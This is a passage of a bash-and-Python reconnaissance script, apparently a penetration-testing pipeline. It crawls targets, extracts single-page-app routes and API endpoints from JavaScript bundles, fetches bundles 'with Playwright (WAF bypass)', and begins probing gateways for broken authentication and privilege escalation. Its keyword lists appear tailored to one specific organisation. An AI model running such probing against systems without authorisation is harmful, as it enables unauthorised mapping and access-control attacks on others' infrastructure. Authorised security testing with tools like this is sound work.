                echo "[ZONE TRANSFER] Refused (expected)"
            fi
        fi
    } > "$dns_hygiene"
    log_ok "DNS hygiene report â†’ $dns_hygiene"

    # â”€â”€ Version fingerprinting summary from httpx â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if [[ -s "$HTTP_DIR/httpx_full.txt" ]]; then
        log_info "Extracting version fingerprints from httpx output..."
        grep -oE "\[([A-Za-z0-9._-]+:[0-9]+\.[0-9]+[.0-9]*)\]" "$HTTP_DIR/httpx_full.txt" 2>/dev/null | \
            sort -u > "$infra_dir/versions.txt" || true
        local ver_count; ver_count=$(wc -l < "$infra_dir/versions.txt" 2>/dev/null || echo 0)
        [[ "$ver_count" -gt 0 ]] && log_ok "Version fingerprints: ${ver_count} â†’ $infra_dir/versions.txt"
    fi

    log_ok "Infrastructure analysis complete â†’ $infra_dir/"
}

# â”€â”€â”€ Phase 5: Web Crawling & URL Collection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
phase_crawl() {
    if $SKIP_CRAWL; then
        log_warn "Skipping web crawl (--skip-crawl)"
        return
    fi

    log_phase "Phase 5: Web Crawling & URL Collection"

    [[ ! -s "$LIVE_HOSTS" ]] && { log_warn "No live hosts to crawl."; return; }

    # Katana
    if require_tool katana; then
        log_info "Crawling with katana (depth=${DEPTH}, JS parsing enabled)..."
        local katana_args=(-u "$LIVE_HOSTS" -d "$DEPTH" -jc -aff -kf all -silent -timeout 10)
        [[ -n "$SCOPE_REGEX" ]] && katana_args+=(-cs "$SCOPE_REGEX")
        [[ ${#AUTH_KATANA_OPTS[@]} -gt 0 ]] && katana_args+=("${AUTH_KATANA_OPTS[@]}")
        katana "${katana_args[@]}" 2>/dev/null | anew_append "$ALL_URLS" | wc -l | \
            { read _n; log_ok "  katana: ${_n} new URLs"; }

        # Headless for SPAs â€” hard cap at 5 min so it never hangs the pipeline
        log_info "Katana headless mode (SPA/dynamic content, max 5m)..."
        timeout 300 katana -u "$LIVE_HOSTS" -d 2 -headless -jc -silent -timeout 15 -c 3 \
            ${AUTH_KATANA_OPTS[@]+"${AUTH_KATANA_OPTS[@]}"} 2>/dev/null | \
            anew_append "$ALL_URLS" | wc -l | { read _n; log_ok "  katana headless: ${_n} new URLs"; } || \
            log_warn "  katana headless: timed out / exited early (URLs saved so far)"
    fi

    # GAU
    if require_tool gau; then
        log_info "Collecting archived URLs (gau)..."
        gau "$TARGET" \
            --threads 5 \
            --subs \
            --blacklist png,jpg,gif,svg,css,woff,ttf,ico,eot \
            --providers wayback,commoncrawl,otx,urlscan 2>/dev/null | \
            anew_append "$ALL_URLS" | wc -l | { read _n; log_ok "  gau: ${_n} new URLs"; }
    fi

    # Waybackurls
    if require_tool waybackurls; then
        log_info "Querying Wayback Machine..."
        echo "$TARGET" | waybackurls 2>/dev/null | \
            anew_append "$ALL_URLS" | wc -l | { read _n; log_ok "  waybackurls: ${_n} new URLs"; }
    fi

    # Hakrawler â€” fast link + form crawler with auth support
    if require_tool hakrawler; then
        log_info "Crawling with hakrawler..."
        local _hak_args=(-depth "$DEPTH" -plain -insecure -timeout 10 -subs)
        [[ ${#AUTH_CURL_OPTS[@]} -gt 0 ]] && {
            # Extract cookie/header from AUTH_CURL_OPTS for hakrawler
            local _i=0
            while [[ $_i -lt ${#AUTH_CURL_OPTS[@]} ]]; do
                if [[ "${AUTH_CURL_OPTS[$_i]}" == "-H" ]]; then
                    local _hv="${AUTH_CURL_OPTS[$((_i+1))]}"
                    [[ "$_hv" =~ ^Cookie: ]] && _hak_args+=(-cookie "${_hv#Cookie: }")
                    [[ "$_hv" =~ ^Authorization: ]] && _hak_args+=(-h "$_hv")
                    (( _i+=2 )) || true
                else
                    (( _i++ )) || true
                fi
            done
        }
        cat "$LIVE_HOSTS" | hakrawler "${_hak_args[@]}" 2>/dev/null | \
            anew_append "$ALL_URLS" | wc -l | { read _n; log_ok "  hakrawler: ${_n} new URLs"; }
    fi

    # Waymore
    if require_tool waymore; then
        log_info "Running waymore (URL + response archive)..."
        waymore -i "$TARGET" -mode U -oU "$URLS_DIR/waymore.txt" -q 2>/dev/null || true
        if [[ -s "$URLS_DIR/waymore.txt" ]]; then
            cat "$URLS_DIR/waymore.txt" | anew_append "$ALL_URLS" | wc -l | \
                { read _n; log_ok "  waymore: ${_n} new URLs"; }
        fi
    fi

    # Deduplicate
    sort -u "$ALL_URLS" -o "$ALL_URLS"
    local url_count; url_count=$(wc -l < "$ALL_URLS" 2>/dev/null || echo 0)
    log_ok "Total unique URLs: ${BOLD}${url_count}${RESET}"

    # Strip WAF/CDN challenge noise â€” these are never real app endpoints and
    # will produce 100% false positives in every vuln phase (XSS, SSTI, SQLiâ€¦).
    # Patterns: Incapsula _Incapsula_Resource, Cloudflare /cdn-cgi/, Akamai ghost
    # paths, and known CDN bot-challenge query params.
    local _before_filter; _before_filter=$(wc -l < "$ALL_URLS")
    grep -viE \
        '/_Incapsula_Resource(\?|$)|[?&]SWJIYLWA=|/cdn-cgi/|/__akamai|[?&]__cf_|/apc-challenge' \
        "$ALL_URLS" 2>/dev/null | sort -u > "${ALL_URLS}.clean" \
        && mv "${ALL_URLS}.clean" "$ALL_URLS" || true
    local _after_filter; _after_filter=$(wc -l < "$ALL_URLS")
    local _removed=$(( _before_filter - _after_filter ))
    [[ $_removed -gt 0 ]] && \
        log_info "  WAF/CDN noise removed: ${_removed} URLs stripped (${_after_filter} clean URLs remain)"

    # Extract JS files
    grep -E "\.js(\?|$)" "$ALL_URLS" 2>/dev/null | sort -u > "$JS_FILES" || true
    log_ok "JS files found: $(wc -l < "$JS_FILES" 2>/dev/null || echo 0)"

    # SPA / hash-route discovery â€” handles baseurl/#/endpoint apps
    _spa_route_discovery
}

# â”€â”€â”€ SPA hash-route discovery â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Covers Angular/Vue/React apps that use /#/route style navigation.
# Two complementary passes:
#   1. JS bundle route extraction  â€” parses route tables from the minified bundle
#   2. Playwright SPA crawler      â€” intercepts hashchange / popstate at runtime
# Both write discovered hash-URLs into ALL_URLS.
_spa_route_discovery() {
    local base_url; base_url=$(head -1 "$LIVE_HOSTS" 2>/dev/null)
    [[ -z "$base_url" ]] && return

    local spa_dir="$URLS_DIR/spa"
    mkdir -p "$spa_dir"
    local spa_routes="$spa_dir/spa_routes.txt"
    > "$spa_routes"

    log_info "SPA route discovery (hash-routing: /#/endpoint)..."

    # â”€â”€ Pass 0: Framework & routing-style detection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # Fetch the base page + first app bundle, determine:
    #   â€¢ Framework: Angular / React / Vue
    #   â€¢ Routing style: hash (#/) vs history (path-based)
    #   â€¢ Lazy chunks referenced in the main bundle
    local _detected_framework="unknown"
    local _detected_hash_routing=false
    local root_html
    root_html=$(curl -s --connect-timeout 10 --max-time 20 \
        ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} "$base_url" 2>/dev/null) || true

    # Detect main app bundle (first non-polyfill, non-runtime .js in JS_FILES)
    local _main_bundle_url=""
    while IFS= read -r _jsu; do
        [[ "$_jsu" =~ /(runtime|polyfills|zone|styles)\. ]] && continue
        _main_bundle_url="$_jsu"
        break
    done < <(grep -iE '/(main|app|index|bundle)\.' "$JS_FILES" 2>/dev/null; \
              grep -viE '/(runtime|polyfills|zone|styles)\.' "$JS_FILES" 2>/dev/null | head -3)

    local _main_bundle_content=""
    if [[ -n "$_main_bundle_url" ]]; then
        _main_bundle_content=$(curl -s --connect-timeout 10 --max-time 30 \
            ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} "$_main_bundle_url" 2>/dev/null) || true
    fi

    # Combine root HTML + main bundle for detection
    local _detect_corpus="${root_html}${_main_bundle_content}"

    if echo "$_detect_corpus" | grep -qiE '@angular|NgModule|platformBrowserDynamic|RouterModule|zone\.js'; then
        _detected_framework="Angular"
    elif echo "$_detect_corpus" | grep -qiE 'react-router|BrowserRouter|HashRouter|createBrowserRouter|createHashRouter'; then
        _detected_framework="React"
    elif echo "$_detect_corpus" | grep -qiE 'vue-router|createRouter|VueRouter'; then
        _detected_framework="Vue"
    fi

    # Hash-routing detection: Angular useHash:!0/true, HashLocationStrategy,
    # explicit /#/ links in the HTML, HashRouter (React), createWebHashHistory (Vue)
    if echo "$_detect_corpus" | grep -qiE \
        'useHash\s*:\s*(!0|true)|HashLocationStrategy|HashRouter|createWebHashHistory'; then
        _detected_hash_routing=true
    elif echo "$root_html" | grep -qE 'href=["'"'"']#/|href=["'"'"'][^"'"'"']*/#/'; then
        _detected_hash_routing=true
    fi

    log_info "  Framework detected: ${_detected_framework} | Hash routing: ${_detected_hash_routing}"

    # Discover lazy-loaded webpack chunks referenced in the main bundle and add
    # them to JS_FILES so Pass 1 can scan them too.
    if [[ -n "$_main_bundle_content" ]]; then
        local _chunk_base; _chunk_base=$(echo "$_main_bundle_url" | sed 's|/[^/]*$|/|')
        # Webpack chunk manifest patterns: "chunkId":"filename", or chunk arrays
        echo "$_main_bundle_content" | grep -oP '["'"'"']([a-f0-9]{8,20}\.js|chunk\.[a-z0-9.]+\.js)["'"'"']' \
            | tr -d '"'"'" | sort -u | while read -r _chunk; do
            local _chunk_url="${_chunk_base}${_chunk}"
            grep -qF "$_chunk_url" "$JS_FILES" 2>/dev/null || echo "$_chunk_url" >> "$JS_FILES"
        done
        # Also look for named chunks: {1:"home",2:"dashboard",...}+".chunk.js"
        local _chunk_count_before; _chunk_count_before=$(wc -l < "$JS_FILES")
        echo "$_main_bundle_content" | grep -oP '"([a-zA-Z0-9_-]+)"\s*\+\s*["\.].*?chunk' \
            | grep -oP '"([a-zA-Z0-9_-]+)"' | tr -d '"' | sort -u | while read -r _cname; do
            for _ext in ".chunk.js" "-chunk.js"; do
                local _curl="${_chunk_base}${_cname}${_ext}"
                grep -qF "$_curl" "$JS_FILES" 2>/dev/null || echo "$_curl" >> "$JS_FILES"
            done
        done
        local _chunk_count_after; _chunk_count_after=$(wc -l < "$JS_FILES")
        local _new_chunks=$(( _chunk_count_after - _chunk_count_before ))
        [[ $_new_chunks -gt 0 ]] && log_info "  Discovered ${_new_chunks} additional webpack chunks â†’ added to JS scan list"
    fi

    # â”€â”€ Pass 1: JS bundle route table extraction â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # Python extractor handles both minified (unquoted keys) and non-minified
    # bundles. The critical fix: minified Angular/React/Vue bundles use
    # path:"value" (no quotes on the key) â€” bash grep for "path":"value" misses
    # everything. Python covers both forms plus redirectTo, loadChildren, navigate.
    local js_count=0
    if [[ -s "$JS_FILES" ]]; then
        log_info "  Extracting routes from JS bundles ($(wc -l < "$JS_FILES") files)..."
        while IFS= read -r js_url; do
            local js_content
            js_content=$(curl -s --connect-timeout 10 --max-time 20 \
                ${AUTH_CURL_OPTS[@]+"${AUTH_CURL_OPTS[@]}"} "$js_url" 2>/dev/null) || continue
            [[ -z "$js_content" ]] && continue

            echo "$js_content" | python3 - "$spa_routes" << 'PYROUTES'
import sys, re

content = sys.stdin.read()
out_file = sys.argv[1]

routes = set()

patterns = [
    # Minified: unquoted key  path:"value" or path:'value'  â† the critical fix
    r'''(?<!\w)path\s*:\s*"([^"#*{}\n]{1,120})"''',
    r"""(?<!\w)path\s*:\s*'([^'#*{}\n]{1,120})'""",
    # Non-minified: quoted key  "path":"value"
    r'''"path"\s*:\s*"([^"#*{}\n]{1,120})"''',
    r'''"path"\s*:\s*'([^'#*{}\n]{1,120})'  ''',
    # redirectTo (Angular)
    r'''(?<!\w)redirectTo\s*:\s*"([^"#*{}\n]{1,120})"''',
    r"""(?<!\w)redirectTo\s*:\s*'([^'#*{}\n]{1,120})'""",
    # Hash hrefs: href="#/foo" or href='#/foo'
    r'''href=["']#/([^"' >]{1,120})''',
    # router.navigate(["/path"]) / this.$router.push("/path") / history.push
    r'''(?:navigate|push|replace)\s*\(\s*\[?\s*["']([^"'#*\n]{1,120})["']''',
    # loadChildren / component lazy strings
    r'''loadChildren\s*:\s*["']([^"'#*\n]{1,60})["']''',
]

for pat in patterns:
    for m in re.finditer(pat, content):
        val = m.group(1).strip().strip('/')
        # Skip empties, wildcards, template vars, file extensions, full URLs
        if not val:
            continue
        if re.search(r'[*{}\[\]<>()\\]|^https?://', val):
            continue
        if re.search(r'\.(js|ts|css|html|json|png|jpg|svg|woff)$', val, re.I):
            continue
        if len(val) > 100:
            continue
        routes.add(val)

if routes:
    with open(out_file, 'a') as f:
        for r in sorted(routes):
            f.write(r + '\n')
PYROUTES
            (( js_count++ )) || true
        done < "$JS_FILES"
        log_ok "  JS bundle scan: ${js_count} files parsed, $(wc -l < "$spa_routes" 2>/dev/null || echo 0) raw route strings extracted"
    fi

    # Also scan the root HTML for inline scripts and href="#/..." anchors
    if [[ -n "$root_html" ]]; then
        echo "$root_html" | python3 - "$spa_routes" << 'PYHTML'
import sys, re
content = sys.stdin.read()
out_file = sys.argv[1]
routes = set()
for m in re.finditer(r'''href=["']#/([^"' >]{1,120})''', content):
    routes.add(m.group(1).strip('/'))
for m in re.finditer(r'''(?<!\w)path\s*:\s*["']([^"'#*{}\n]{1,120})["']''', content):
    val = m.group(1).strip('/')
    if val and not re.search(r'[*{}<>\\]', val):
        routes.add(val)
if routes:
    with open(out_file, 'a') as f:
        for r in sorted(routes):
            f.write(r + '\n')
PYHTML
    fi

    # â”€â”€ Pass 2: Playwright runtime SPA crawl â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # Navigate the app with a real browser, intercept every hash change + link,
    # and collect all reachable /#/ routes.
    if python3 -c "import playwright" 2>/dev/null; then
        log_info "  Playwright SPA crawl (runtime hash-route interception, max 3m)..."
        local pw_out="$spa_dir/playwright_spa.txt"

        timeout 180 python3 - "$base_url" "$pw_out" \
            "${AUTH_TOKEN:-}" "${AUTH_COOKIE:-}" \
            "${JWT_COOKIE_NAME:-}" "${JWT_COOKIE_MODE:-false}" \
            << 'PYEOF'
import asyncio, sys, re, json
from urllib.parse import urlparse, urljoin

target_url   = sys.argv[1]
out_file     = sys.argv[2]
auth_token   = sys.argv[3] if len(sys.argv) > 3 else ""
auth_cookie  = sys.argv[4] if len(sys.argv) > 4 else ""
jwt_cookie   = sys.argv[5] if len(sys.argv) > 5 else ""
jwt_mode     = sys.argv[6].lower() == "true" if len(sys.argv) > 6 else False

from playwright.async_api import async_playwright

async def run():
    discovered = set()
    base_origin = urlparse(target_url).scheme + "://" + urlparse(target_url).netloc

    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=["--no-sandbox","--disable-setuid-sandbox","--disable-dev-shm-usage"]
        )
        ctx_args = {}
        if auth_token and not jwt_mode:
            ctx_args["extra_http_headers"] = {"Authorization": f"Bearer {auth_token}"}
        ctx = await browser.new_context(**ctx_args)

        # Inject cookies
        if auth_cookie:
            for part in auth_cookie.split(";"):
                part = part.strip()
                if "=" in part:
                    name, _, val = part.partition("=")
                    await ctx.add_cookies([{"name": name.strip(), "value": val.strip(),
                                            "url": target_url}])
        if jwt_mode and jwt_cookie and auth_token:
            await ctx.add_cookies([{"name": jwt_cookie, "value": auth_token,
                                    "url": target_url}])

        page = await ctx.new_page()

        # Capture every URL the page navigates to (hash changes + pushState)
        def on_url_change(url):
            if "#/" in url:
                frag = url.split("#/", 1)[1].split("?")[0].split("#")[0]
                if frag:
                    discovered.add(frag)

        page.on("framenavigated", lambda f: on_url_change(f.url) if f == page.main_frame else None)

        # Intercept JS calls that mutate location.hash / history.pushState
        await page.add_init_script("""
            window.__spa_routes = [];
            const _pushState = history.pushState.bind(history);
            history.pushState = function(s,t,u){ _pushState(s,t,u); if(u) window.__spa_routes.push(u); };
            const _replaceState = history.replaceState.bind(history);
            history.replaceState = function(s,t,u){ _replaceState(s,t,u); if(u) window.__spa_routes.push(u); };
            const _hashDesc = Object.getOwnPropertyDescriptor(window.location.__proto__, 'hash') ||
                              Object.getOwnPropertyDescriptor(window.location, 'hash');
            if (_hashDesc && _hashDesc.set) {
                const origSet = _hashDesc.set;
                Object.defineProperty(window.location, 'hash', {
                    set(v){ origSet.call(this,v); window.__spa_routes.push(v); },
                    get(){ return _hashDesc.get.call(this); },
                    configurable: true
                });
            }
        """)

        try:
            await page.goto(target_url, wait_until="networkidle", timeout=30000)
        except Exception:
            try:
                await page.goto(target_url, wait_until="domcontentloaded", timeout=20000)
            except Exception:
                pass

        # Collect hrefs already present in the DOM
        anchors = await page.eval_on_selector_all(
            "a[href]",
            "els => els.map(e => e.getAttribute('href'))"
        )
        for href in anchors:
            if href and href.startswith("#/"):
                discovered.add(href[2:])
            elif href and "/#/" in href:
                discovered.add(href.split("/#/",1)[1].split("?")[0])

        # Click every nav link / router-link and collect resulting hash routes
        nav_selectors = [
            "a[href^='#/']", "a[href*='/#/']",
            "[routerlink]", "[data-routerlink]",
            "nav a", ".nav a", ".menu a", ".sidebar a",
            "[class*='nav'] a", "[class*='menu'] a", "[class*='link']"
        ]
        for sel in nav_selectors:
            try:
                els = await page.query_selector_all(sel)
                for el in els[:30]:   # cap per selector to avoid infinite loops
                    try:
                        href = await el.get_attribute("href")
                        if href and ("#/" in href or href.startswith("#/")):
                            frag = href.split("#/",1)[1].split("?")[0] if "#/" in href else ""
                            if frag:
                                discovered.add(frag)
                        await el.click(timeout=3000)
                        await page.wait_for_timeout(800)
                        cur = page.url
                        on_url_change(cur)
                    except Exception:
                        pass
            except Exception:
                pass

        # Collect any routes captured via the patched history/hash API
        try:
            extra = await page.evaluate("window.__spa_routes || []")
            for u in extra:
                on_url_change(str(u))
        except Exception:
            pass

        await browser.close()

    with open(out_file, "w") as f:
        for r in sorted(discovered):
            f.write(r + "\n")

asyncio.run(run())
PYEOF
        if [[ -s "$pw_out" ]]; then
            cat "$pw_out" >> "$spa_routes"
            log_ok "  Playwright SPA: $(wc -l < "$pw_out") hash-routes captured"
        else
            log_warn "  Playwright SPA: no hash-routes found (may not be a hash-router app)"
        fi
    else
        log_warn "  Playwright not installed â€” skipping runtime SPA crawl (install: pip3 install playwright && playwright install chromium)"
    fi

    # â”€â”€ Normalise & generate full URLs â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if [[ -s "$spa_routes" ]]; then
        # Clean: strip leading slashes, collapse duplicates, skip wildcards/params
        sort -u "$spa_routes" | grep -v '^\s*$' | grep -v '\*' | \
        sed 's|^/||; s|/$||' | grep -E '^[a-zA-Z0-9]' | sort -u > "${spa_routes}.clean"

        local hash_urls="$spa_dir/hash_urls.txt"
        local path_urls="$spa_dir/path_urls.txt"
        > "$hash_urls"
        > "$path_urls"

        # Build URLs in both formats â€” hash (/#/route) and path (/route).
        # Which one the app actually uses is determined by _detected_hash_routing,
        # but we emit both so no route gets dropped if detection was wrong.
        while IFS= read -r route; do
            echo "${base_url}/#/${route}" >> "$hash_urls"
            echo "${base_url}/${route}"   >> "$path_urls"
        done < "${spa_routes}.clean"
        sort -u "$hash_urls" -o "$hash_urls"
        sort -u "$path_urls"  -o "$path_urls"

        # Primary format goes into ALL_URLS based on detected routing style
        local _primary_urls="$path_urls"
        $_detected_hash_routing && _primary_urls="$hash_urls"

        local new_spa; new_spa=$(cat "$_primary_urls" | anew_append "$ALL_URLS" | wc -l)
        # Always also add the other format (cheap, avoids missed coverage)
        local _alt_urls="$hash_urls"
        [[ "$_primary_urls" == "$hash_urls" ]] && _alt_urls="$path_urls"
        cat "$_alt_urls" | anew_append "$ALL_URLS" > /dev/null || true

        local total_routes; total_routes=$(wc -l < "${spa_routes}.clean")
        log_ok "SPA route discovery: ${total_routes} routes â†’ ${new_spa} new URLs added"
        log_ok "  Hash URLs : $hash_urls"
        log_ok "  Path URLs : $path_urls"
        log_ok "  Routing   : $(${_detected_hash_routing} && echo 'hash (#/)' || echo 'history (path-based)')"
    else
        log_warn "  No SPA routes found â€” bundle regex matched nothing"
        log_warn "  Try: manually inspect $(head -1 "$JS_FILES" 2>/dev/null) for route patterns"
    fi
}

# â”€â”€â”€ Phase 5b: JS Bundle Analysis & API Endpoint Discovery â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Uses Playwright (WAF bypass) to fetch Angular/React/Vue JS bundles, then:
#   1. Extracts all API endpoint paths and microservice prefixes
#   2. Extracts environment base URLs (gateways, auth servers, storage)
#   3. Probes discovered gateways for unauthenticated access (BOLA / broken auth)
# Results: recon/js/api_endpoints.txt, recon/js/env_urls.txt,
#          vulns/js_analysis/endpoint_probe.txt
phase_js_analysis() {
    [[ ! -s "$JS_FILES" ]] && { log_warn "No JS files found â€” skipping JS bundle analysis."; return; }

    log_phase "Phase 5b: JS Bundle Analysis & API Endpoint Discovery"

    local base_url; base_url=$(head -1 "$LIVE_HOSTS" 2>/dev/null)
    [[ -z "$base_url" ]] && base_url="https://$TARGET"

    # Identify main app bundles (skip vendor/polyfill/zone)
    local main_bundles=()
    while IFS= read -r js_url; do
        if echo "$js_url" | grep -qiE '/(main|app|index|bundle)\.' && \
           ! echo "$js_url" | grep -qiE '/(runtime|polyfills|zone|vendor)\.' && \
           echo "$js_url" | grep -qiE "^https?://$TARGET"; then
            main_bundles+=("$js_url")
        fi
    done < "$JS_FILES"
    # Fallback: first non-vendor JS on target domain
    if [[ ${#main_bundles[@]} -eq 0 ]]; then
        while IFS= read -r js_url; do
            echo "$js_url" | grep -qiE "^https?://$TARGET" || continue
            echo "$js_url" | grep -qiE '/(runtime|polyfills|zone|vendor)\.' && continue
            main_bundles+=("$js_url")
            [[ ${#main_bundles[@]} -ge 3 ]] && break
        done < "$JS_FILES"
    fi

    if [[ ${#main_bundles[@]} -eq 0 ]]; then
        log_warn "No main app bundle identified â€” skipping JS bundle analysis."
        return
    fi

    log_info "Fetching JS bundles with Playwright (WAF bypass)..."
    local bundles_fetched=0

    python3 - "$JS_BUNDLES_DIR" "${main_bundles[@]}" << 'PYFETCH'
import sys, os, re
from playwright.sync_api import sync_playwright

out_dir = sys.argv[1]
urls = sys.argv[2:]

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    ctx = browser.new_context()
    page = ctx.new_page()

    # Warm up WAF on target domain first
    if urls:
        from urllib.parse import urlparse
        origin = urlparse(urls[0])._replace(path='/', query='', fragment='').geturl()
        try:
            page.goto(origin, timeout=20000, wait_until='domcontentloaded')
        except Exception:
            pass

    for url in urls:
        try:
            resp = page.goto(url, timeout=30000, wait_until='domcontentloaded')
            if resp and resp.status == 200:
                content = resp.body()
                fname = re.sub(r'[^a-zA-Z0-9._-]', '_', url.split('/')[-1])
                fpath = os.path.join(out_dir, fname)
                with open(fpath, 'wb') as f:
                    f.write(content)
                print(f"OK:{fpath}:{len(content)}")
            else:
                print(f"FAIL:{url}:{resp.status if resp else 0}")
        except Exception as e:
            print(f"ERR:{url}:{e}")

    browser.close()
PYFETCH

    # Count fetched bundles
    bundles_fetched=$(ls -1 "$JS_BUNDLES_DIR"/*.js 2>/dev/null | wc -l || echo 0)
    if [[ $bundles_fetched -eq 0 ]]; then
        log_warn "Could not fetch any JS bundles (WAF / network issue)."
        return
    fi
    log_ok "  Fetched $bundles_fetched JS bundle(s) for analysis"

    # Extract API endpoints and environment URLs from all bundles
    log_info "Extracting API endpoints and environment URLs from bundles..."
    python3 - "$JS_BUNDLES_DIR" "$JS_API_ENDPOINTS" "$JS_ENV_URLS" << 'PYEXTRACT'
import sys, os, re, glob

bundle_dir = sys.argv[1]
api_out    = sys.argv[2]
env_out    = sys.argv[3]

api_paths = set()
env_urls  = set()

API_KW = ['api','auth','user','token','login','upload','report','export','admin',
          'manage','config','setting','data','list','create','update','delete',
          'search','file','role','permission','password','profile','dashboard',
          'account','farmer','survey','master','bulk','download','csv','batch',
          'transaction','training','supplier','statistics','child','social',
          'campaign','distribution','reject','atsource','tracking','geofence']

for fpath in glob.glob(os.path.join(bundle_dir, '*.js')):
    with open(fpath, 'r', errors='ignore') as f:
        content = f.read()

    # API paths: /something/something (2+ segments)
    for m in re.finditer(r'["\x60]((?:/[a-zA-Z0-9_-]+){2,})["\x60]', content):
        p = m.group(1)
        if any(kw in p.lower() for kw in API_KW) and len(p) < 150:
            api_paths.add(p)

    # /ofis* microservice paths
    for m in re.finditer(r'["\x60](/ofis[a-zA-Z0-9-]+/[^"\x60\s<>]{3,})["\x60]', content):
        api_paths.add(m.group(1))

    # Environment / base URLs (http/https)
    for m in re.finditer(r'["\x60](https?://[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}(?:/[^"\x60\s<>]*)?)["\x60]', content):
        u = m.group(1)
        if any(kw in u.lower() for kw in ['api','auth','gateway','zuul','service','module','ofis','oga','ofi','olam']):
            env_urls.add(u)

with open(api_out, 'w') as f:
    for p in sorted(api_paths):
        f.write(p + '\n')

with open(env_out, 'w') as f:
    for u in sorted(env_urls):
        f.write(u + '\n')

print(f"DONE:{len(api_paths)}:{len(env_urls)}")
PYEXTRACT

    local api_count; api_count=$(wc -l < "$JS_API_ENDPOINTS" 2>/dev/null || echo 0)
    local env_count; env_count=$(wc -l < "$JS_ENV_URLS" 2>/dev/null || echo 0)
    log_ok "  API endpoints extracted: $api_count"
    log_ok "  Environment/base URLs found: $env_count"

    [[ $api_count -eq 0 ]] && return

    # Probe extracted gateways + base URLs â€” unauthenticated AND authenticated
    local _has_auth=false
    [[ -n "$AUTH_TOKEN" || -n "$AUTH_COOKIE" || -n "$AUTH_HEADER" ]] && _has_auth=true

    if $_has_auth; then
        log_info "Probing API gateways â€” unauthenticated + authenticated (BOLA / priv-esc)..."
    else
        log_info "Probing API gateways for broken authentication (no token supplied)..."
    fi

    # Build the auth string to pass into Python
    local _auth_header_val=""
    if [[ -n "$AUTH_TOKEN" ]]; then
        _auth_header_val="Authorization: Bearer ${AUTH_TOKEN}"
    elif [[ -n "$AUTH_HEADER" ]]; then
        _auth_header_val="$AUTH_HEADER"
    fi
    local _auth_cookie_val="${AUTH_COOKIE:-}"
    local _jwt_user_id="${AUTH_JWT_USER_ID:-}"

    local _js_vuln_dir="$OUTDIR/vulns/js_analysis"
    local _waf_cookies_file="$_js_vuln_dir/waf_cookies.txt"
    local _auth_urls_file="$_js_vuln_dir/auth_open_urls.txt"
    local _unauth_urls_file="$_js_vuln_dir/unauth_open_urls.txt"
    touch "$_waf_cookies_file" "$_auth_urls_file" "$_unauth_urls_file"

    python3 - "$JS_ENV_URLS" "$JS_API_ENDPOINTS" "$JS_PROBE_RESULTS" \
              "$TARGET" "$_auth_header_val" "$_auth_cookie_val" "$_jwt_user_id" \
              "$_waf_cookies_file" "$_auth_urls_file" "$_unauth_urls_file" << 'PYPROBE'
import sys, os, re, json, base64, itertools
from playwright.sync_api import sync_playwright

env_urls_file    = sys.argv[1]
api_paths_file   = sys.argv[2]
probe_out        = sys.argv[3]
target           = sys.argv[4]
auth_header      = sys.argv[5]   # e.g. "Authorization: Bearer eyJ..."
auth_cookie      = sys.argv[6]   # e.g. "JSESSIONID=abc; token=xyz"
jwt_user_id      = sys.argv[7]   # extracted sub/user_id from JWT claims
waf_cookies_file = sys.argv[8]   # output: WAF cookies for tool reuse
auth_urls_file   = sys.argv[9]   # output: auth-reachable full URLs
unauth_urls_file = sys.argv[10]  # output: unauthenticated open URLs

strip_tags = lambda s: re.sub(r'<[^>]+>', '', s).strip()
has_auth = bool(auth_header or auth_cookie)

def decode_jwt_payload(token):
    try:
        parts = token.split('.')
        if len(parts) < 2:
            return {}
        pad = parts[1] + '=' * (-len(parts[1]) % 4)
        return json.loads(base64.urlsafe_b64decode(pad))
    except Exception:
        return {}

# Extract user ID from JWT if not already provided
if not jwt_user_id and auth_header and 'Bearer ' in auth_header:
    tok = auth_header.split('Bearer ', 1)[1].strip()
    claims = decode_jwt_payload(tok)
    for k in ['sub','user_id','userId','uid','id','account_id','email']:
        if k in claims:
            jwt_user_id = str(claims[k])
            break

# Load gateway base URLs
gw_hosts = set()
with open(env_urls_file) as f:
    for line in f:
        u = line.strip()
        m = re.match(r'(https?://[^/]+)', u)
        if m:
            origin = m.group(1)
            host = origin.split('//')[-1].lower()
            if any(kw in host for kw in ['gateway','zuul','api','common','ofis','service']):
                gw_hosts.add(origin)
gw_hosts.add(f"https://{target}")

# Load and prioritise API paths
with open(api_paths_file) as f:
    all_paths = [l.strip() for l in f if l.strip()]

priority_kw = ['user','role','permission','admin','auth','password','delete','save',
               'update','download','report','upload','bulk','getall','manage',
               'farmer','transaction','survey','master','list','create']
priority = [p for p in all_paths if any(k in p.lower() for k in priority_kw)]
rest     = [p for p in all_paths if p not in priority]
probe_paths = (priority + rest)[:100]

# Admin/sensitive endpoint patterns for privilege escalation checks
